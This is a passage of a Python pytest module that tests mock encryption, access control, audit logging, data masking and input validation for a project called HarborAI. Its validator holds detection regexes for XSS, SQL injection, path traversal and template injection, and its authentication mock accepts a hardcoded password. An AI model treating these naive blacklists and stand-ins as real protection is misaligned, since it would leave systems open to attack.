# -*- coding: utf-8 -*-
"""
HarborAI 安全合规测试模块

本模块测试系统的安全合规功能，包括：
- API密钥管理和保护
- 数据加密和解密
- 访问控制和权限管理
- 审计日志和安全监控
- 输入验证和防护
- 敏感数据处理
- 安全配置验证
- 合规性检查

作者: HarborAI Team
创建时间: 2024-01-20
"""

import pytest
import os
import json
import hashlib
import hmac
import base64
import tempfile
import time
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from unittest.mock import Mock, patch, MagicMock, call
from pathlib import Path
import secrets
import re
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import logging
from enum import Enum
import threading
from concurrent.futures import ThreadPoolExecutor
import sqlite3


# 安全级别枚举
class SecurityLevel(Enum):
    """安全级别枚举"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


# 权限类型枚举
class PermissionType(Enum):
    """权限类型枚举"""
    READ = "read"
    WRITE = "write"
    EXECUTE = "execute"
    ADMIN = "admin"
    DELETE = "delete"


# 审计事件类型枚举
class AuditEventType(Enum):
    """审计事件类型枚举"""
    LOGIN = "login"
    LOGOUT = "logout"
    API_CALL = "api_call"
    CONFIG_CHANGE = "config_change"
    PERMISSION_CHANGE = "permission_change"
    DATA_ACCESS = "data_access"
    SECURITY_VIOLATION = "security_violation"
    SYSTEM_ERROR = "system_error"


@dataclass
class SecurityConfig:
    """安全配置数据类"""
    encryption_enabled: bool = True
    key_rotation_interval: int = 86400  # 24小时
    max_login_attempts: int = 3
    session_timeout: int = 3600  # 1小时
    audit_log_enabled: bool = True
    sensitive_data_masking: bool = True
    api_rate_limiting: bool = True
    require_https: bool = True
    password_min_length: int = 8
    password_complexity: bool = True


@dataclass
class User:
    """用户数据类"""
    id: str
    username: str
    email: str
    permissions: Set[PermissionType] = field(default_factory=set)
    is_active: bool = True
    last_login: Optional[datetime] = None
    failed_login_attempts: int = 0
    created_at: datetime = field(default_factory=datetime.now)


@dataclass
class AuditEvent:
    """审计事件数据类"""
    id: str
    event_type: AuditEventType
    user_id: Optional[str]
    resource: str
    action: str
    result: str  # success, failure, error
    details: Dict[str, Any] = field(default_factory=dict)
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    security_level: SecurityLevel = SecurityLevel.MEDIUM


class MockEncryptionManager:
    """模拟加密管理器"""
    
    def __init__(self, config: SecurityConfig):
        self.config = config
        self._master_key = Fernet.generate_key()
        self._fernet = Fernet(self._master_key)
        self._key_rotation_time = datetime.now()
        self._encryption_keys = {}
        self._key_versions = {}
    
    def generate_key(self, key_id: str) -> str:
        """生成新的加密密钥"""
        key = Fernet.generate_key()
        self._encryption_keys[key_id] = key
        self._key_versions[key_id] = 1
        return base64.b64encode(key).decode('utf-8')
    
    def encrypt_data(self, data: str, key_id: str = None) -> str:
        """加密数据"""
        if not self.config.encryption_enabled:
            return data
        
        if key_id and key_id in self._encryption_keys:
            fernet = Fernet(self._encryption_keys[key_id])
        else:
            fernet = self._fernet
        
        encrypted_data = fernet.encrypt(data.encode('utf-8'))
        return base64.b64encode(encrypted_data).decode('utf-8')
    
    def decrypt_data(self, encrypted_data: str, key_id: str = None) -> str:
        """解密数据"""
        if not self.config.encryption_enabled:
            return encrypted_data
        
        try:
            encrypted_bytes = base64.b64decode(encrypted_data.encode('utf-8'))
            
            if key_id and key_id in self._encryption_keys:
                fernet = Fernet(self._encryption_keys[key_id])
            else:
                fernet = self._fernet
            
            decrypted_data = fernet.decrypt(encrypted_bytes)
            return decrypted_data.decode('utf-8')
        except Exception as e:
            raise ValueError(f"解密失败: {str(e)}")
    
    def rotate_key(self, key_id: str) -> str:
        """轮换密钥"""
        new_key = Fernet.generate_key()
        old_version = self._key_versions.get(key_id, 0)
        
        self._encryption_keys[key_id] = new_key
        self._key_versions[key_id] = old_version + 1
        
        return base64.b64encode(new_key).decode('utf-8')
    
    def is_key_rotation_needed(self, key_id: str) -> bool:
        """检查是否需要密钥轮换"""
        if not hasattr(self, '_key_creation_time'):
            self._key_creation_time = {}
        
        if key_id not in self._key_creation_time:
            self._key_creation_time[key_id] = datetime.now()
            return False
        
        time_diff = datetime.now() - self._key_creation_time[key_id]
        return time_diff.total_seconds() > self.config.key_rotation_interval
    
    def hash_password(self, password: str, salt: str = None) -> Tuple[str, str]:
        """哈希密码"""
        if salt is None:
            salt = secrets.token_hex(16)
        
        # 使用PBKDF2进行密码哈希
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt.encode('utf-8'),
            iterations=100000,
        )
        
        key = kdf.derive(password.encode('utf-8'))
        hashed_password = base64.b64encode(key).decode('utf-8')
        
        return hashed_password, salt
    
    def verify_password(self, password: str, hashed_password: str, salt: str) -> bool:
        """验证密码"""
        try:
            computed_hash, _ = self.hash_password(password, salt)
            return hmac.compare_digest(computed_hash, hashed_password)
        except Exception:
            return False


class MockAccessControlManager:
    """模拟访问控制管理器"""
    
    def __init__(self, config: SecurityConfig):
        self.config = config
        self._users: Dict[str, User] = {}
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._role_permissions: Dict[str, Set[PermissionType]] = {
            'admin': {PermissionType.READ, PermissionType.WRITE, PermissionType.EXECUTE, PermissionType.ADMIN, PermissionType.DELETE},
            'user': {PermissionType.READ, PermissionType.WRITE},
            'readonly': {PermissionType.READ}
        }
        self._resource_permissions: Dict[str, Set[PermissionType]] = {}
    
    def create_user(self, username: str, email: str, permissions: Set[PermissionType] = None) -> User:
        """创建用户"""
        user_id = secrets.token_hex(16)
        user = User(
            id=user_id,
            username=username,
            email=email,
            permissions=permissions or set()
        )
        self._users[user_id] = user
        return user
    
    def authenticate_user(self, username: str, password: str) -> Optional[str]:
        """用户认证"""
        user = self.get_user_by_username(username)
        if not user:
            return None
        
        if not user.is_active:
            return None
        
        if user.failed_login_attempts >= self.config.max_login_attempts:
            return None
        
        # 模拟密码验证（实际应该使用加密管理器）
        if password == "correct_password":
            user.last_login = datetime.now()
            user.failed_login_attempts = 0
            
            # 创建会话
            session_id = secrets.token_hex(32)
            self._sessions[session_id] = {
                'user_id': user.id,
                'created_at': datetime.now(),
                'last_activity': datetime.now()
            }
            
            return session_id
        else:
            user.failed_login_attempts += 1
            return None
    
    def get_user_by_username(self, username: str) -> Optional[User]:
        """根据用户名获取用户"""
        for user in self._users.values():
            if user.username == username:
                return user
        return None
    
    def get_user_by_session(self, session_id: str) -> Optional[User]:
        """根据会话ID获取用户"""
        session = self._sessions.get(session_id)
        if not session:
            return None
        
        # 检查会话是否过期
        if self.is_session_expired(session_id):
            self.invalidate_session(session_id)
            return None
        
        # 更新最后活动时间
        session['last_activity'] = datetime.now()
        
        return self._users.get(session['user_id'])
    
    def is_session_expired(self, session_id: str) -> bool:
        """检查会话是否过期"""
        session = self._sessions.get(session_id)
        if not session:
            return True
        
        time_diff = datetime.now() - session['last_activity']
        return time_diff.total_seconds() > self.config.session_timeout
    
    def invalidate_session(self, session_id: str) -> bool:
        """使会话失效"""
        return self._sessions.pop(session_id, None) is not None
    
    def check_permission(self, user: User, resource: str, permission: PermissionType) -> bool:
        """检查用户权限"""
        if not user.is_active:
            return False
        
        # 检查用户直接权限
        if permission in user.permissions:
            return True
        
        # 检查资源特定权限
        resource_perms = self._resource_permissions.get(resource, set())
        if permission in resource_perms:
            return True
        
        # 管理员权限
        if PermissionType.ADMIN in user.permissions:
            return True
        
        return False
    
    def grant_permission(self, user_id: str, permission: PermissionType) -> bool:
        """授予权限"""
        user = self._users.get(user_id)
        if user:
            user.permissions.add(permission)
            return True
        return False
    
    def revoke_permission(self, user_id: str, permission: PermissionType) -> bool:
        """撤销权限"""
        user = self._users.get(user_id)
        if user and permission in user.permissions:
            user.permissions.remove(permission)
            return True
        return False
    
    def set_resource_permissions(self, resource: str, permissions: Set[PermissionType]):
        """设置资源权限"""
        self._resource_permissions[resource] = permissions


class MockAuditLogger:
    """模拟审计日志记录器"""
    
    def __init__(self, config: SecurityConfig):
        self.config = config
        self._events: List[AuditEvent] = []
        self._event_handlers: Dict[AuditEventType, List[callable]] = {}
        self._lock = threading.Lock()
    
    def log_event(self, event: AuditEvent) -> bool:
        """记录审计事件"""
        if not self.config.audit_log_enabled:
            return False
        
        with self._lock:
            self._events.append(event)
            
            # 触发事件处理器
            handlers = self._event_handlers.get(event.event_type, [])
            for handler in handlers:
                try:
                    handler(event)
                except Exception as e:
                    # 记录处理器错误，但不影响主流程
                    pass
        
        return True
    
    def log_login_attempt(self, username: str, success: bool, ip_address: str = None) -> bool:
        """记录登录尝试"""
        event = AuditEvent(
            id=secrets.token_hex(16),
            event_type=AuditEventType.LOGIN,
            user_id=username,
            resource="authentication",
            action="login",
            result="success" if success else "failure",
            ip_address=ip_address,
            security_level=SecurityLevel.HIGH if not success else SecurityLevel.MEDIUM
        )
        
        return self.log_event(event)
    
    def log_api_call(self, user_id: str, endpoint: str, method: str, status_code: int, 
                     ip_address: str = None, user_agent: str = None) -> bool:
        """记录API调用"""
        event = AuditEvent(
            id=secrets.token_hex(16),
            event_type=AuditEventType.API_CALL,
            user_id=user_id,
            resource=endpoint,
            action=method,
            result="success" if 200 <= status_code < 400 else "failure",
            details={"status_code": status_code},
            ip_address=ip_address,
            user_agent=user_agent
        )
        
        return self.log_event(event)
    
    def log_security_violation(self, user_id: str, violation_type: str, details: Dict[str, Any]) -> bool:
        """记录安全违规"""
        event = AuditEvent(
            id=secrets.token_hex(16),
            event_type=AuditEventType.SECURITY_VIOLATION,
            user_id=user_id,
            resource="security",
            action=violation_type,
            result="violation",
            details=details,
            security_level=SecurityLevel.CRITICAL
        )
        
        return self.log_event(event)
    
    def get_events(self, event_type: AuditEventType = None, user_id: str = None, 
                   start_time: datetime = None, end_time: datetime = None) -> List[AuditEvent]:
        """获取审计事件"""
        with self._lock:
            events = self._events.copy()
        
        # 应用过滤器
        if event_type:
            events = [e for e in events if e.event_type == event_type]
        
        if user_id:
            events = [e for e in events if e.user_id == user_id]
        
        if start_time:
            events = [e for e in events if e.timestamp >= start_time]
        
        if end_time:
            events = [e for e in events if e.timestamp <= end_time]
        
        return events
    
    def add_event_handler(self, event_type: AuditEventType, handler: callable):
        """添加事件处理器"""
        if event_type not in self._event_handlers:
            self._event_handlers[event_type] = []
        self._event_handlers[event_type].append(handler)
    
    def get_security_summary(self, hours: int = 24) -> Dict[str, Any]:
        """获取安全摘要"""
        start_time = datetime.now() - timedelta(hours=hours)
        events = self.get_events(start_time=start_time)
        
        summary = {
            'total_events': len(events),
            'by_type': {},
            'by_security_level': {},
            'failed_logins': 0,
            'security_violations': 0,
            'unique_users': set(),
            'unique_ips': set()
        }
        
        for event in events:
            # 按类型统计
            event_type_str = event.event_type.value
            summary['by_type'][event_type_str] = summary['by_type'].get(event_type_str, 0) + 1
            
            # 按安全级别统计
            level_str = event.security_level.value
            summary['by_security_level'][level_str] = summary['by_security_level'].get(level_str, 0) + 1
            
            # 特殊事件统计
            if event.event_type == AuditEventType.LOGIN and event.result == "failure":
                summary['failed_logins'] += 1
            
            if event.event_type == AuditEventType.SECURITY_VIOLATION:
                summary['security_violations'] += 1
            
            # 用户和IP统计
            if event.user_id:
                summary['unique_users'].add(event.user_id)
            
            if event.ip_address:
                summary['unique_ips'].add(event.ip_address)
        
        # 转换集合为计数
        summary['unique_users'] = len(summary['unique_users'])
        summary['unique_ips'] = len(summary['unique_ips'])
        
        return summary


class MockInputValidator:
    """模拟输入验证器"""
    
    def __init__(self, config: SecurityConfig):
        self.config = config
        self._validation_rules = {
            'email': r'^[a-zA-Z0-9]([a-zA-Z0-9_+%-]*[a-zA-Z0-9]|[a-zA-Z0-9_+%-]*\.[a-zA-Z0-9_+%-]*[a-zA-Z0-9])*@[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9]|[a-zA-Z0-9-]*\.[a-zA-Z0-9-]*[a-zA-Z0-9])*\.[a-zA-Z]{2,}$',
            'username': r'^[a-zA-Z0-9_]{3,20}$',
            'api_key': r'^[a-zA-Z0-9]{32,}$',
            'url': r'^https?://[a-zA-Z0-9.-]+(?::[0-9]+)?(?:/.*)?$'
        }
        self._dangerous_patterns = [
            r'<script[^>]*>.*?</script>',  # XSS
            r'javascript:',  # JavaScript URL
            r'on\w+\s*=',  # Event handlers
            r'\b(union|select|insert|update|delete|drop|create|alter)\b',  # SQL injection
            r'\.\./',  # Path traversal
            r'\$\{.*\}',  # Template injection
        ]
    
    def validate_input(self, input_value: str, input_type: str) -> Tuple[bool, str]:
        """验证输入"""
        if not input_value:
            return False, "输入不能为空"
        
        # 检查危险模式
        if self.contains_dangerous_patterns(input_value):
            return False, "输入包含潜在危险内容"
        
        # 类型特定验证
        if input_type in self._validation_rules:
            pattern = self._validation_rules[input_type]
            if not re.match(pattern, input_value, re.IGNORECASE):
                return False, f"输入格式不符合{input_type}要求"
        
        return True, "验证通过"
    
    def contains_dangerous_patterns(self, input_value: str) -> bool:
        """检查是否包含危险模式"""
        for pattern in self._dangerous_patterns:
            if re.search(pattern, input_value, re.IGNORECASE):
                return True
        return False
    
    def sanitize_input(self, input_value: str) -> str:
        """清理输入"""
        # HTML实体编码
        sanitized = input_value.replace('&', '&amp;')
        sanitized = sanitized.replace('<', '&lt;')
        sanitized = sanitized.replace('>', '&gt;')
        sanitized = sanitized.replace('"', '&quot;')
        sanitized = sanitized.replace("'", '&#x27;')
        
        return sanitized
    
    def validate_password(self, password: str) -> Tuple[bool, List[str]]:
        """验证密码强度"""
        errors = []
        
        if len(password) < self.config.password_min_length:
            errors.append(f"密码长度至少{self.config.password_min_length}位")
        
        if self.config.password_complexity:
            if not re.search(r'[a-z]', password):
                errors.append("密码必须包含小写字母")
            
            if not re.search(r'[A-Z]', password):
                errors.append("密码必须包含大写字母")
            
            if not re.search(r'\d', password):
                errors.append("密码必须包含数字")
            
            if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
                errors.append("密码必须包含特殊字符")
        
        return len(errors) == 0, errors
    
    def validate_api_key_format(self, api_key: str) -> bool:
        """验证API密钥格式"""
        if not api_key:
            return False
        
        # 检查长度
        if len(api_key) < 32:
            return False
        
        # 检查字符
        if not re.match(r'^[a-zA-Z0-9_-]+$', api_key):
            return False
        
        return True


class MockDataMasker:
    """模拟数据脱敏器"""
    
    def __init__(self, config: SecurityConfig):
        self.config = config
        self._sensitive_patterns = {
            'email': r'([a-zA-Z0-9._%+-]{1,4})[a-zA-Z0-9._%+-]*@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
            'phone': r'^(\d{3})(\d{4})(\d{4})$',
            'credit_card': r'^(\d{4})(\d{4})(\d{4})(\d{4})$',
            'api_key': r'(sk-[a-zA-Z0-9]{5})([a-zA-Z0-9]+)',
            'ssn': r'^(\d{3})-(\d{2})-(\d{4})$'
        }
    
    def mask_sensitive_data(self, data: str, data_type: str = None) -> str:
        """脱敏敏感数据"""
        if not self.config.sensitive_data_masking:
            return data
        
        masked_data = data
        
        if data_type and data_type in self._sensitive_patterns:
            pattern = self._sensitive_patterns[data_type]
            if data_type == 'email':
                masked_data = re.sub(pattern, r'\1***@\2', masked_data)
            elif data_type == 'phone':
                masked_data = re.sub(pattern, r'\1****\3', masked_data)
            elif data_type == 'credit_card':
                masked_data = re.sub(pattern, r'\1****\3****', masked_data)
            elif data_type == 'api_key':
                masked_data = re.sub(pattern, r'\1***', masked_data)
            elif data_type == 'ssn':
                masked_data = re.sub(pattern, r'***-**-\3', masked_data)
        else:
            # 自动检测和脱敏
            for pattern_type, pattern in self._sensitive_patterns.items():
                if pattern_type == 'email':
                    masked_data = re.sub(pattern, r'\1***@\2', masked_data)
                elif pattern_type == 'phone':
                    masked_data = re.sub(pattern, r'\1****\3', masked_data)
                elif pattern_type == 'api_key':
                    masked_data = re.sub(pattern, r'\1***', masked_data)
        
        return masked_data
    
    def is_sensitive_data(self, data: str) -> Tuple[bool, str]:
        """检查是否为敏感数据"""
        for data_type, pattern in self._sensitive_patterns.items():
            if re.search(pattern, data):
                return True, data_type
        return False, ""
    
    def mask_log_data(self, log_message: str) -> str:
        """脱敏日志数据"""
        masked_message = log_message
        
        # 脱敏所有检测到的敏感数据
        for pattern_type, pattern in self._sensitive_patterns.items():
            if pattern_type == 'email':
                masked_message = re.sub(pattern, r'\1***@\2', masked_message)
            elif pattern_type == 'phone':
                masked_message = re.sub(pattern, r'\1****\3', masked_message)
            elif pattern_type == 'api_key':
                masked_message = re.sub(pattern, r'\1***', masked_message)
        
        return masked_message


class TestSecurityEncryption:
    """安全加密测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.encryption_manager = MockEncryptionManager(self.config)
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_data_encryption_decryption(self):
        """测试数据加密解密"""
        original_data = "这是需要加密的敏感数据"
        
        # 加密数据
        encrypted_data = self.encryption_manager.encrypt_data(original_data)
        
        assert encrypted_data != original_data
        assert len(encrypted_data) > 0
        
        # 解密数据
        decrypted_data = self.encryption_manager.decrypt_data(encrypted_data)
        
        assert decrypted_data == original_data
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_key_generation_and_management(self):
        """测试密钥生成和管理"""
        key_id = "test_key_001"
        
        # 生成密钥
        key = self.encryption_manager.generate_key(key_id)
        
        assert key is not None
        assert len(key) > 0
        
        # 使用指定密钥加密
        data = "测试数据"
        encrypted = self.encryption_manager.encrypt_data(data, key_id)
        decrypted = self.encryption_manager.decrypt_data(encrypted, key_id)
        
        assert decrypted == data
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_key_rotation(self):
        """测试密钥轮换"""
        key_id = "rotation_test_key"
        
        # 生成初始密钥
        original_key = self.encryption_manager.generate_key(key_id)
        
        # 轮换密钥
        new_key = self.encryption_manager.rotate_key(key_id)
        
        assert new_key != original_key
        assert len(new_key) > 0
        
        # 验证新密钥可以正常使用
        data = "轮换测试数据"
        encrypted = self.encryption_manager.encrypt_data(data, key_id)
        decrypted = self.encryption_manager.decrypt_data(encrypted, key_id)
        
        assert decrypted == data
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_password_hashing_and_verification(self):
        """测试密码哈希和验证"""
        password = "SecurePassword123!"
        
        # 哈希密码
        hashed_password, salt = self.encryption_manager.hash_password(password)
        
        assert hashed_password != password
        assert len(salt) > 0
        
        # 验证正确密码
        assert self.encryption_manager.verify_password(password, hashed_password, salt)
        
        # 验证错误密码
        assert not self.encryption_manager.verify_password("WrongPassword", hashed_password, salt)
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_encryption_with_disabled_config(self):
        """测试禁用加密配置"""
        # 禁用加密
        disabled_config = SecurityConfig(encryption_enabled=False)
        disabled_manager = MockEncryptionManager(disabled_config)
        
        original_data = "未加密数据"
        
        # 应该返回原始数据
        encrypted_data = disabled_manager.encrypt_data(original_data)
        assert encrypted_data == original_data
        
        decrypted_data = disabled_manager.decrypt_data(encrypted_data)
        assert decrypted_data == original_data
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_encryption_error_handling(self):
        """测试加密错误处理"""
        # 测试解密无效数据
        with pytest.raises(ValueError, match="解密失败"):
            self.encryption_manager.decrypt_data("invalid_encrypted_data")
        
        # 测试使用不存在的密钥
        data = "测试数据"
        encrypted = self.encryption_manager.encrypt_data(data, "nonexistent_key")
        
        # 应该使用默认密钥加密
        decrypted = self.encryption_manager.decrypt_data(encrypted)
        assert decrypted == data


class TestAccessControl:
    """访问控制测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.access_manager = MockAccessControlManager(self.config)
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_user_creation_and_authentication(self):
        """测试用户创建和认证"""
        # 创建用户
        user = self.access_manager.create_user(
            username="testuser",
            email="test@example.com",
            permissions={PermissionType.READ, PermissionType.WRITE}
        )
        
        assert user.username == "testuser"
        assert user.email == "test@example.com"
        assert PermissionType.READ in user.permissions
        assert PermissionType.WRITE in user.permissions
        assert user.is_active
        
        # 认证用户
        session_id = self.access_manager.authenticate_user("testuser", "correct_password")
        
        assert session_id is not None
        assert len(session_id) > 0
        
        # 通过会话获取用户
        authenticated_user = self.access_manager.get_user_by_session(session_id)
        assert authenticated_user.id == user.id
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_failed_authentication(self):
        """测试认证失败"""
        # 创建用户
        self.access_manager.create_user("testuser", "test@example.com")
        
        # 错误密码认证
        session_id = self.access_manager.authenticate_user("testuser", "wrong_password")
        assert session_id is None
        
        # 不存在的用户
        session_id = self.access_manager.authenticate_user("nonexistent", "password")
        assert session_id is None
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_permission_management(self):
        """测试权限管理"""
        # 创建用户
        user = self.access_manager.create_user("testuser", "test@example.com")
        
        # 授予权限
        assert self.access_manager.grant_permission(user.id, PermissionType.ADMIN)
        assert PermissionType.ADMIN in user.permissions
        
        # 撤销权限
        assert self.access_manager.revoke_permission(user.id, PermissionType.ADMIN)
        assert PermissionType.ADMIN not in user.permissions
        
        # 对不存在用户的权限操作
        assert not self.access_manager.grant_permission("nonexistent", PermissionType.READ)
        assert not self.access_manager.revoke_permission("nonexistent", PermissionType.READ)
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_permission_checking(self):
        """测试权限检查"""
        # 创建用户
        user = self.access_manager.create_user(
            "testuser",
            "test@example.com",
            permissions={PermissionType.READ}
        )
        
        # 检查已有权限
        assert self.access_manager.check_permission(user, "resource1", PermissionType.READ)
        
        # 检查没有的权限
        assert not self.access_manager.check_permission(user, "resource1", PermissionType.WRITE)
        
        # 授予管理员权限后应该有所有权限
        self.access_manager.grant_permission(user.id, PermissionType.ADMIN)
        assert self.access_manager.check_permission(user, "resource1", PermissionType.WRITE)
        assert self.access_manager.check_permission(user, "resource1", PermissionType.DELETE)
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_session_management(self):
        """测试会话管理"""
        # 创建用户并认证
        user = self.access_manager.create_user("testuser", "test@example.com")
        session_id = self.access_manager.authenticate_user("testuser", "correct_password")
        
        # 验证会话有效
        assert not self.access_manager.is_session_expired(session_id)
        
        # 使会话失效
        assert self.access_manager.invalidate_session(session_id)
        
        # 验证会话已失效
        authenticated_user = self.access_manager.get_user_by_session(session_id)
        assert authenticated_user is None
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_login_attempt_limiting(self):
        """测试登录尝试限制"""
        # 创建用户
        user = self.access_manager.create_user("testuser", "test@example.com")
        
        # 多次失败登录
        for i in range(self.config.max_login_attempts):
            session_id = self.access_manager.authenticate_user("testuser", "wrong_password")
            assert session_id is None
        
        # 达到最大尝试次数后，即使密码正确也应该失败
        session_id = self.access_manager.authenticate_user("testuser", "correct_password")
        assert session_id is None
        
        # 验证失败次数
        assert user.failed_login_attempts >= self.config.max_login_attempts
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_inactive_user_access(self):
        """测试非活跃用户访问"""
        # 创建用户
        user = self.access_manager.create_user("testuser", "test@example.com")
        
        # 禁用用户
        user.is_active = False
        
        # 尝试认证
        session_id = self.access_manager.authenticate_user("testuser", "correct_password")
        assert session_id is None
        
        # 检查权限
        assert not self.access_manager.check_permission(user, "resource", PermissionType.READ)


class TestAuditLogging:
    """审计日志测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.audit_logger = MockAuditLogger(self.config)
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_basic_event_logging(self):
        """测试基础事件记录"""
        event = AuditEvent(
            id="test_event_001",
            event_type=AuditEventType.API_CALL,
            user_id="user123",
            resource="/api/models",
            action="GET",
            result="success"
        )
        
        # 记录事件
        assert self.audit_logger.log_event(event)
        
        # 获取事件
        events = self.audit_logger.get_events()
        assert len(events) == 1
        assert events[0].id == "test_event_001"
        assert events[0].event_type == AuditEventType.API_CALL
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_login_attempt_logging(self):
        """测试登录尝试记录"""
        # 记录成功登录
        assert self.audit_logger.log_login_attempt("user123", True, "192.168.1.100")
        
        # 记录失败登录
        assert self.audit_logger.log_login_attempt("user123", False, "192.168.1.100")
        
        # 获取登录事件
        login_events = self.audit_logger.get_events(event_type=AuditEventType.LOGIN)
        assert len(login_events) == 2
        
        success_event = next(e for e in login_events if e.result == "success")
        failure_event = next(e for e in login_events if e.result == "failure")
        
        assert success_event.security_level == SecurityLevel.MEDIUM
        assert failure_event.security_level == SecurityLevel.HIGH
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_api_call_logging(self):
        """测试API调用记录"""
        # 记录成功API调用
        assert self.audit_logger.log_api_call(
            "user123", "/api/chat", "POST", 200, 
            "192.168.1.100", "Mozilla/5.0"
        )
        
        # 记录失败API调用
        assert self.audit_logger.log_api_call(
            "user123", "/api/chat", "POST", 403, 
            "192.168.1.100", "Mozilla/5.0"
        )
        
        # 获取API调用事件
        api_events = self.audit_logger.get_events(event_type=AuditEventType.API_CALL)
        assert len(api_events) == 2
        
        success_event = next(e for e in api_events if e.result == "success")
        failure_event = next(e for e in api_events if e.result == "failure")
        
        assert success_event.details["status_code"] == 200
        assert failure_event.details["status_code"] == 403
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_security_violation_logging(self):
        """测试安全违规记录"""
        violation_details = {
            "violation_type": "unauthorized_access",
            "attempted_resource": "/admin/users",
            "user_permissions": ["read"]
        }
        
        # 记录安全违规
        assert self.audit_logger.log_security_violation(
            "user123", "unauthorized_access", violation_details
        )
        
        # 获取安全违规事件
        violation_events = self.audit_logger.get_events(event_type=AuditEventType.SECURITY_VIOLATION)
        assert len(violation_events) == 1
        
        event = violation_events[0]
        assert event.security_level == SecurityLevel.CRITICAL
        assert event.details["violation_type"] == "unauthorized_access"
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_event_filtering(self):
        """测试事件过滤"""
        # 创建多个不同类型的事件
        events_data = [
            (AuditEventType.LOGIN, "user1"),
            (AuditEventType.API_CALL, "user1"),
            (AuditEventType.LOGIN, "user2"),
            (AuditEventType.SECURITY_VIOLATION, "user1")
        ]
        
        for event_type, user_id in events_data:
            event = AuditEvent(
                id=secrets.token_hex(8),
                event_type=event_type,
                user_id=user_id,
                resource="test",
                action="test",
                result="success"
            )
            self.audit_logger.log_event(event)
        
        # 按事件类型过滤
        login_events = self.audit_logger.get_events(event_type=AuditEventType.LOGIN)
        assert len(login_events) == 2
        
        # 按用户过滤
        user1_events = self.audit_logger.get_events(user_id="user1")
        assert len(user1_events) == 3
        
        # 组合过滤
        user1_login_events = self.audit_logger.get_events(
            event_type=AuditEventType.LOGIN, user_id="user1"
        )
        assert len(user1_login_events) == 1
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_security_summary(self):
        """测试安全摘要"""
        # 创建各种事件
        test_events = [
            (AuditEventType.LOGIN, "success", SecurityLevel.MEDIUM),
            (AuditEventType.LOGIN, "failure", SecurityLevel.HIGH),
            (AuditEventType.LOGIN, "failure", SecurityLevel.HIGH),
            (AuditEventType.API_CALL, "success", SecurityLevel.LOW),
            (AuditEventType.SECURITY_VIOLATION, "violation", SecurityLevel.CRITICAL)
        ]
        
        for event_type, result, security_level in test_events:
            event = AuditEvent(
                id=secrets.token_hex(8),
                event_type=event_type,
                user_id="user123",
                resource="test",
                action="test",
                result=result,
                security_level=security_level,
                ip_address="192.168.1.100"
            )
            self.audit_logger.log_event(event)
        
        # 获取安全摘要
        summary = self.audit_logger.get_security_summary()
        
        assert summary['total_events'] == 5
        assert summary['failed_logins'] == 2
        assert summary['security_violations'] == 1
        assert summary['unique_users'] == 1
        assert summary['unique_ips'] == 1
        assert summary['by_security_level']['critical'] == 1
        assert summary['by_security_level']['high'] == 2
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_audit_disabled_config(self):
        """测试禁用审计配置"""
        # 禁用审计
        disabled_config = SecurityConfig(audit_log_enabled=False)
        disabled_logger = MockAuditLogger(disabled_config)
        
        event = AuditEvent(
            id="test_event",
            event_type=AuditEventType.API_CALL,
            user_id="user123",
            resource="test",
            action="test",
            result="success"
        )
        
        # 应该返回False（未记录）
        assert not disabled_logger.log_event(event)
        
        # 事件列表应该为空
        events = disabled_logger.get_events()
        assert len(events) == 0


class TestInputValidation:
    """输入验证测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.validator = MockInputValidator(self.config)
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_email_validation(self):
        """测试邮箱验证"""
        # 有效邮箱
        valid_emails = [
            "test@example.com",
            "user.name@domain.co.uk",
            "test+tag@example.org"
        ]
        
        for email in valid_emails:
            is_valid, message = self.validator.validate_input(email, "email")
            assert is_valid, f"邮箱 {email} 应该有效，但验证失败: {message}"
        
        # 无效邮箱
        invalid_emails = [
            "invalid-email",
            "@example.com",
            "test@",
            "test..test@example.com"
        ]
        
        for email in invalid_emails:
            is_valid, message = self.validator.validate_input(email, "email")
            assert not is_valid, f"邮箱 {email} 应该无效，但验证通过"
    
    @pytest.mark.unit
